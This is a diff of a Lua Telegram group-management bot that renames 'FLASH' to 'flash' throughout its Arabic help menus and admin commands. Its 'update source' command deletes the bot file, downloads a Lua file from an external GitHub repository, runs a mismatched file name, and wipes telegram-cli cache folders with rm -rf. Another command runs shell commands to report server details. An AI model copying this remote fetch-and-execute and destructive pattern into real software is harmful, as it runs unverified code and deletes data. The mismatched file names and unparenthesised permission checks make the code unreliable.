+--     By Developer flash     -- 
 if is_leader(msg) and text:match("^استعاده الاوامر$") then
-FLASHdx1:del(FLASH..'bot:help', text)
-FLASHdx1:del(FLASH..'bot:help1', text)
-FLASHdx1:del(FLASH..'bot:help2', text)
-FLASHdx1:del(FLASH..'bot:help3', text) 
-FLASHdx1:del(FLASH..'bot:help4', text)
-FLASHdx1:del(FLASH..'bot:help5', text) 
-FLASHdx1:del(FLASH..'bot:help6', text) 
-FLASHdx1:del(FLASH..'bot:help7', text) 
-FLASHdx1:del(FLASH..'bot:help8', text) 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم استعاده الكلايش الاصليه " ,  1, "md")
+flashdx1:del(flash..'bot:help', text)
+flashdx1:del(flash..'bot:help1', text)
+flashdx1:del(flash..'bot:help2', text)
+flashdx1:del(flash..'bot:help3', text) 
+flashdx1:del(flash..'bot:help4', text)
+flashdx1:del(flash..'bot:help5', text) 
+flashdx1:del(flash..'bot:help6', text) 
+flashdx1:del(flash..'bot:help7', text) 
+flashdx1:del(flash..'bot:help8', text) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم استعاده الكلايش الاصليه " ,  1, "md")
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_leader(msg) and text:match("^تعيين الاوامر$") then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help0'..msg.sender_user_id_..'', 'msg')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
+flashdx1:set(flash..'bot:help0'..msg.sender_user_id_..'', 'msg')
 return false end
 if text:match("^(.*)$") then
-local FLASH =  FLASHdx1:get(FLASH..'bot:help0'..msg.sender_user_id_..'')
-if FLASH == 'msg' then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help0'..msg.sender_user_id_..'', 'no')
-FLASHdx1:set(FLASH..'bot:help', text)
-FLASHdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
+local flash =  flashdx1:get(flash..'bot:help0'..msg.sender_user_id_..'')
+if flash == 'msg' then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
+flashdx1:set(flash..'bot:help0'..msg.sender_user_id_..'', 'no')
+flashdx1:set(flash..'bot:help', text)
+flashdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
 return false end
 end
---     By Developer FLASH     -- 
-if text:match("^الاوامر$") and FLASH11(msg) then
-local help = FLASHdx1:get(FLASH..'bot:help')
+--     By Developer flash     -- 
+if text:match("^الاوامر$") and flash11(msg) then
+local help = flashdx1:get(flash..'bot:help')
 local text =  [[
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
 ❅∫ اليك اوامر البوت ↓↓
@@ -9193,29 +9193,29 @@ local text =  [[
 ❅∫ ارسل (م7) لعرض اوامر مسح القوائم
 ❅∫ ارسل (م8) لعرض اوامر المطورين
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
-❅∫ مطور البوت : @]]..SudoFLASH..[[
+❅∫ مطور البوت : @]]..Sudoflash..[[
 
 ❅∫ قناة السورس : @FAQY4
 ]] 
-FLASHdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html') 
+flashdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html') 
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_leader(msg) and text:match("^تعيين امر م1$") then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help01'..msg.sender_user_id_..'', 'msg')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
+flashdx1:set(flash..'bot:help01'..msg.sender_user_id_..'', 'msg')
 return false end
 if text:match("^(.*)$") then
-local FLASH =  FLASHdx1:get(FLASH..'bot:help01'..msg.sender_user_id_..'')
-if FLASH == 'msg' then 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help01'..msg.sender_user_id_..'', 'no')
-FLASHdx1:set(FLASH..'bot:help1', text)
-FLASHdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
+local flash =  flashdx1:get(flash..'bot:help01'..msg.sender_user_id_..'')
+if flash == 'msg' then 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
+flashdx1:set(flash..'bot:help01'..msg.sender_user_id_..'', 'no')
+flashdx1:set(flash..'bot:help1', text)
+flashdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
 return false end
 end
---     By Developer FLASH     -- 
-if text:match("^م1$") or  text:match("^م١$") and FLASH11(msg) then 
-local help = FLASHdx1:get(FLASH..'bot:help1')
+--     By Developer flash     -- 
+if text:match("^م1$") or  text:match("^م١$") and flash11(msg) then 
+local help = flashdx1:get(flash..'bot:help1')
 local text =  [[
 ❅∫ اوامر الحمايه
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
@@ -9259,29 +9259,29 @@ local text =  [[
           • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
 ❅∫ الكل بالساعات + عدد الساعات
            • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
-❅∫ مطور البوت : @]]..SudoFLASH..[[
+❅∫ مطور البوت : @]]..Sudoflash..[[
 
 ❅∫ قناة السورس : @FAQY4
 ]]
-FLASHdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
 end 
---     By Developer FLASH     -- 
-if is_leader(msg) and text:match("^تعيين امر م2$") and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help21'..msg.sender_user_id_..'', 'msg')
+--     By Developer flash     -- 
+if is_leader(msg) and text:match("^تعيين امر م2$") and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
+flashdx1:set(flash..'bot:help21'..msg.sender_user_id_..'', 'msg')
 return false end
 if text:match("^(.*)$") then
-local FLASH =  FLASHdx1:get(FLASH..'bot:help21'..msg.sender_user_id_..'')
-if FLASH == 'msg' then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help21'..msg.sender_user_id_..'', 'no')
-FLASHdx1:set(FLASH..'bot:help2', text)
-FLASHdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
+local flash =  flashdx1:get(flash..'bot:help21'..msg.sender_user_id_..'')
+if flash == 'msg' then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
+flashdx1:set(flash..'bot:help21'..msg.sender_user_id_..'', 'no')
+flashdx1:set(flash..'bot:help2', text)
+flashdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
 return false end
 end
---     By Developer FLASH     -- 
-if text:match("^م2$") or text:match("^م٢$") and FLASH11(msg) then
-local help = FLASHdx1:get(FLASH..'bot:help2')
+--     By Developer flash     -- 
+if text:match("^م2$") or text:match("^م٢$") and flash11(msg) then
+local help = flashdx1:get(flash..'bot:help2')
 local text =  [[
 ❅∫ اوامر المشرفين
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
@@ -9351,29 +9351,29 @@ local text =  [[
 ❅∫ المقيدين « » الاعضاء المميزين 
 ❅∫ الصلاحيات « » الاوامر المضافه
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
-❅∫ مطور البوت : @]]..SudoFLASH..[[
+❅∫ مطور البوت : @]]..Sudoflash..[[
 
 ❅∫ قناة السورس : @FAQY4
 ]]
-FLASHdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
 end 
---     By Developer FLASH     -- 
-if is_leader(msg) and text:match("^تعيين امر م3$") and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help31'..msg.sender_user_id_..'', 'msg')
+--     By Developer flash     -- 
+if is_leader(msg) and text:match("^تعيين امر م3$") and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
+flashdx1:set(flash..'bot:help31'..msg.sender_user_id_..'', 'msg')
 return false end
 if text:match("^(.*)$") then
-local FLASH =  FLASHdx1:get(FLASH..'bot:help31'..msg.sender_user_id_..'')
-if FLASH == 'msg' then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help31'..msg.sender_user_id_..'', 'no')
-FLASHdx1:set(FLASH..'bot:help3', text)
-FLASHdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
+local flash =  flashdx1:get(flash..'bot:help31'..msg.sender_user_id_..'')
+if flash == 'msg' then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
+flashdx1:set(flash..'bot:help31'..msg.sender_user_id_..'', 'no')
+flashdx1:set(flash..'bot:help3', text)
+flashdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
 return false end
 end 
---     By Developer FLASH     -- 
-if text:match("^م3$") or text:match("^م٣$") and FLASH11(msg) then
-local help = FLASHdx1:get(FLASH..'bot:help3')
+--     By Developer flash     -- 
+if text:match("^م3$") or text:match("^م٣$") and flash11(msg) then
+local help = flashdx1:get(flash..'bot:help3')
 local text =  [[
 ❅∫ اوامر الخدمة 
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
@@ -9434,29 +9434,29 @@ local text =  [[
 ❅∫ الحساب + الايدي 
 ❅∫ طقس + اسم المدينه 
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
-❅∫ مطور البوت : @]]..SudoFLASH..[[
+❅∫ مطور البوت : @]]..Sudoflash..[[
 
 ❅∫ قناة السورس : @FAQY4
 ]]
-FLASHdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_leader(msg) and text:match("^تعيين امر م4$") then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help41'..msg.sender_user_id_..'', 'msg')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
+flashdx1:set(flash..'bot:help41'..msg.sender_user_id_..'', 'msg')
 return false end
 if text:match("^(.*)$") then
-local FLASH =  FLASHdx1:get(FLASH..'bot:help41'..msg.sender_user_id_..'')
-if FLASH == 'msg' then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help41'..msg.sender_user_id_..'', 'no')
-FLASHdx1:set(FLASH..'bot:help4', text)
-FLASHdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
+local flash =  flashdx1:get(flash..'bot:help41'..msg.sender_user_id_..'')
+if flash == 'msg' then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
+flashdx1:set(flash..'bot:help41'..msg.sender_user_id_..'', 'no')
+flashdx1:set(flash..'bot:help4', text)
+flashdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
 return false end
 end
---     By Developer FLASH     -- 
-if text:match("^م٤$") or text:match("^م4$") and FLASH11(msg) then
-local help = FLASHdx1:get(FLASH..'bot:help4')
+--     By Developer flash     -- 
+if text:match("^م٤$") or text:match("^م4$") and flash11(msg) then
+local help = flashdx1:get(flash..'bot:help4')
 local text =  [[
 ❅∫ اوامر الوضع
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
@@ -9480,29 +9480,29 @@ local text =  [[
 ❅∫ الفارسيه + بالتحذير 
 ❅∫ الفارسيه + بدون تحذير 
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
-❅∫ مطور البوت : @]]..SudoFLASH..[[
+❅∫ مطور البوت : @]]..Sudoflash..[[
 
 ❅∫ قناة السورس : @FAQY4
 ]]
-FLASHdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_leader(msg) and text:match("^تعيين امر م5$") then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help51'..msg.sender_user_id_..'', 'msg')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
+flashdx1:set(flash..'bot:help51'..msg.sender_user_id_..'', 'msg')
 return false end
 if text:match("^(.*)$") then
-local FLASH =  FLASHdx1:get(FLASH..'bot:help51'..msg.sender_user_id_..'')
-if FLASH == 'msg' then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help51'..msg.sender_user_id_..'', 'no')
-FLASHdx1:set(FLASH..'bot:help5', text)
-FLASHdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
+local flash =  flashdx1:get(flash..'bot:help51'..msg.sender_user_id_..'')
+if flash == 'msg' then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
+flashdx1:set(flash..'bot:help51'..msg.sender_user_id_..'', 'no')
+flashdx1:set(flash..'bot:help5', text)
+flashdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
 return false end
 end
---     By Developer FLASH     -- 
-if text:match("^م٥$") or text:match("^م5$") and FLASH11(msg) then
-local help = FLASHdx1:get(FLASH..'bot:help5')
+--     By Developer flash     -- 
+if text:match("^م٥$") or text:match("^م5$") and flash11(msg) then
+local help = flashdx1:get(flash..'bot:help5')
 local text =  [[
 ❅∫ اوامر رفع المطورين والمشرفين
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
@@ -9527,29 +9527,29 @@ local text =  [[
 ❅∫ رفع « » تنزيل مميز عام 
 ❅∫ رفع « » تنزيل مطور رتبه ثالثه
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
-❅∫ مطور البوت : @]]..SudoFLASH..[[
+❅∫ مطور البوت : @]]..Sudoflash..[[
 
 ❅∫ قناة السورس : @FAQY4
 ]]
-FLASHdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_leader(msg) and text:match("^تعيين امر م6$") then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help61'..msg.sender_user_id_..'', 'msg')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
+flashdx1:set(flash..'bot:help61'..msg.sender_user_id_..'', 'msg')
 return false end
 if text:match("^(.*)$") then
-local FLASH =  FLASHdx1:get(FLASH..'bot:help61'..msg.sender_user_id_..'')
-if FLASH == 'msg' then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help61'..msg.sender_user_id_..'', 'no')
-FLASHdx1:set(FLASH..'bot:help6', text)
-FLASHdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
+local flash =  flashdx1:get(flash..'bot:help61'..msg.sender_user_id_..'')
+if flash == 'msg' then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
+flashdx1:set(flash..'bot:help61'..msg.sender_user_id_..'', 'no')
+flashdx1:set(flash..'bot:help6', text)
+flashdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
 return false end
 end
---     By Developer FLASH     -- 
-if text:match("^م٦$") or text:match("^م6$") and FLASH11(msg) then
-local help = FLASHdx1:get(FLASH..'bot:help6')
+--     By Developer flash     -- 
+if text:match("^م٦$") or text:match("^م6$") and flash11(msg) then
+local help = flashdx1:get(flash..'bot:help6')
 local text =  [[
 ❅∫ اوامر التفعيل والتعطيل 
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
@@ -9582,29 +9582,29 @@ local text =  [[
 ❅∫ تفعيل « » تعطيل البوت الخدمي 
 ❅∫ تفعيل « » تعطيل الاشتراك الاجباري  
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
-❅∫ مطور البوت : @]]..SudoFLASH..[[
+❅∫ مطور البوت : @]]..Sudoflash..[[
 
 ❅∫ قناة السورس : @FAQY4
 ]]
-FLASHdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_leader(msg) and text:match("^تعيين امر م7$") then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help71'..msg.sender_user_id_..'', 'msg')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
+flashdx1:set(flash..'bot:help71'..msg.sender_user_id_..'', 'msg')
 return false end
 if text:match("^(.*)$") then
-local FLASH =  FLASHdx1:get(FLASH..'bot:help71'..msg.sender_user_id_..'')
-if FLASH == 'msg' then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help71'..msg.sender_user_id_..'', 'no')
-FLASHdx1:set(FLASH..'bot:help7', text)
-FLASHdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
+local flash =  flashdx1:get(flash..'bot:help71'..msg.sender_user_id_..'')
+if flash == 'msg' then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
+flashdx1:set(flash..'bot:help71'..msg.sender_user_id_..'', 'no')
+flashdx1:set(flash..'bot:help7', text)
+flashdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
 return false end
 end
---     By Developer FLASH     -- 
-if text:match("^م٧$") or text:match("^م7$") and FLASH11(msg) then
-local help = FLASHdx1:get(FLASH..'bot:help7') 
+--     By Developer flash     -- 
+if text:match("^م٧$") or text:match("^م7$") and flash11(msg) then
+local help = flashdx1:get(flash..'bot:help7') 
 local text =  [[
 ❅∫ اوامر مسح القوائم  
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
@@ -9637,29 +9637,29 @@ local text =  [[
 ❅∫ مسح المنشئين الاساسيين
 ❅∫ مسح مطورين الرتبه الثالثه
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
-❅∫ مطور البوت : @]]..SudoFLASH..[[
+❅∫ مطور البوت : @]]..Sudoflash..[[
 
 ❅∫ قناة السورس : @FAQY4
 ]]
-FLASHdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_leader(msg) and text:match("^تعيين امر م8$") then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help81'..msg.sender_user_id_..'', 'msg')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الكليشه الان " ,  1, "md")
+flashdx1:set(flash..'bot:help81'..msg.sender_user_id_..'', 'msg')
 return false end
 if text:match("^(.*)$") then
-local FLASH =  FLASHdx1:get(FLASH..'bot:help81'..msg.sender_user_id_..'')
-if FLASH == 'msg' then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
-FLASHdx1:set(FLASH..'bot:help81'..msg.sender_user_id_..'', 'no')
-FLASHdx1:set(FLASH..'bot:help8', text)
-FLASHdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
+local flash =  flashdx1:get(flash..'bot:help81'..msg.sender_user_id_..'')
+if flash == 'msg' then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ الكليشه الجديده " ,  1, "md")
+flashdx1:set(flash..'bot:help81'..msg.sender_user_id_..'', 'no')
+flashdx1:set(flash..'bot:help8', text)
+flashdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
 return false end
 end
---     By Developer FLASH     -- 
-if text:match("^م٨$") or text:match("^م8$") and FLASH11(msg) then
-local help = FLASHdx1:get(FLASH..'bot:help8')
+--     By Developer flash     -- 
+if text:match("^م٨$") or text:match("^م8$") and flash11(msg) then
+local help = flashdx1:get(flash..'bot:help8')
 local text =  [[
 ❅∫ اوامر المطورين
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
@@ -9727,19 +9727,19 @@ local text =  [[
 ❅∫ الغاء فلتر عام   + الكلمه 
 ❅∫ ضع ملاحظه  + الملاحظه   
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
-❅∫ مطور البوت : @]]..SudoFLASH..[[
+❅∫ مطور البوت : @]]..Sudoflash..[[
 
 ❅∫ قناة السورس : @FAQY4
 ]]
-FLASHdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == "تحديث السورس" and is_leader(msg) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ جاري تحديث السورس الى الاصدار الجديد ', 1, 'md') 
-os.execute('rm -rf FLASH.lua') 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ جاري تحديث السورس الى الاصدار الجديد ', 1, 'md') 
+os.execute('rm -rf flash.lua') 
 os.execute('wget https://raw.githubusercontent.com/TEAMFAEDER/FAEDER/master/FAEDER.lua') 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تحديث السورس اكتشف المميزات الجديده الان ', 1, 'md') 
-dofile('FLASH.lua')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تحديث السورس اكتشف المميزات الجديده الان ', 1, 'md') 
+dofile('flash.lua')
 io.popen("rm -rf ~/.telegram-cli/data/audio/*")
 io.popen("rm -rf ~/.telegram-cli/data/document/*")
 io.popen("rm -rf ~/.telegram-cli/data/photo/*")
@@ -9750,9 +9750,9 @@ io.popen("rm -rf ~/.telegram-cli/data/video/*")
 io.popen("rm -rf ~/.telegram-cli/data/voice/*")
 io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == 'تحديث' and is_leader(msg) then  
-dofile('FLASH.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
+dofile('flash.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
 io.popen("rm -rf ~/.telegram-cli/data/document/*") 
 io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
 io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
@@ -9762,32 +9762,32 @@ io.popen("rm -rf ~/.telegram-cli/data/video/*")
 io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
 io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
 print("\27[31;47m\n          🚸) تم تحديث البوت (🚸          \n\27[0;34;49m\n") 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تحديث البوت ", 1, "md")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تحديث البوت ", 1, "md")
 end 
---     By Developer FLASH     -- 
-if text and text:match("^اضف رسائل (%d+)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-FLASH0 = text:match("^اضف رسائل (%d+)$")
-FLASHdx1:set('FLASH:'..bot_id..'id:user'..msg.chat_id_,FLASH0)  
-FLASHdx1:setex('FLASH:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل عدد الرسائل ", 1, "md")
-FLASHdx(msg.chat_id_, msg.id_, 1,Anwar, 1, 'md') 
+--     By Developer flash     -- 
+if text and text:match("^اضف رسائل (%d+)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+flash0 = text:match("^اضف رسائل (%d+)$")
+flashdx1:set('flash:'..bot_id..'id:user'..msg.chat_id_,flash0)  
+flashdx1:setex('flash:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل عدد الرسائل ", 1, "md")
+flashdx(msg.chat_id_, msg.id_, 1,Anwar, 1, 'md') 
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_leader(msg) then
 local text = msg.content_.text_:gsub("[Ss]etprice", "Setnerkh")
 if text and text:match("^ضع كليشه المطور$") then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي كليشه المطور الان ", 1, "md")
-FLASHdx1:setex(FLASH.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي كليشه المطور الان ", 1, "md")
+flashdx1:setex(flash.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
 end end end
 if is_leader(msg) then
 if text and text:match("^مسح كليشه المطور$") then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم مسح كليشه ", 1, "md")
-FLASHdx1:del(FLASH.."nerkh", nerkh)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم مسح كليشه ", 1, "md")
+flashdx1:del(flash.."nerkh", nerkh)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_leader(msg) then 
 if text == 'معلومات السيرفر' or text == 'السيرفر' then 
-FLASHdx(msg.chat_id_, msg.id_, 1, io.popen([[
+flashdx(msg.chat_id_, msg.id_, 1, io.popen([[
 linux_version=`lsb_release -ds`
 memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
 HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
@@ -9801,96 +9801,96 @@ echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ الدخول ،\n`'`wh
 echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ مدة تشغيل السيرفر ،\n`'"$uptime"'`'
 ]]):read('*a'), 1, 'md')
 end end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 end
---     By Developer FLASH     -- 
-----------------******* End Code Source FLASH *******---------
+--     By Developer flash     -- 
+----------------******* End Code Source flash *******---------
 -- Number Update 5
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 elseif (data.ID == "UpdateChat") then
 chat = data.chat_
 chats[chat.id_] = chat
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 elseif (data.ID == "UpdateMessageEdited") then
 local msg = data
 function get_msg_contact(extra, result, success)
 local text = (result.content_.text_ or result.content_.caption_)
 if result.id_ and result.content_.text_ then
-FLASHdx1:set(FLASH..'bot:editid'..result.id_,result.content_.text_)
+flashdx1:set(flash..'bot:editid'..result.id_,result.content_.text_)
 end 
 if not is_vipmem(result.sender_user_id_, result.chat_id_) then
 check_filter_words(result, text)
-if FLASHdx1:get(FLASH..'editmsg'..msg.chat_id_) then
+if flashdx1:get(flash..'editmsg'..msg.chat_id_) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs)
 end
 if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
-if FLASHdx1:get(FLASH..'bot:links:mute'..result.chat_id_) then
+if flashdx1:get(flash..'bot:links:mute'..result.chat_id_) then
 local msgs = {[0] = data.message_id_}
 delete_msg(msg.chat_id_,msgs)
 end end
 if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match("/") then
-if FLASHdx1:get(FLASH..'bot:webpage:mute'..result.chat_id_) then
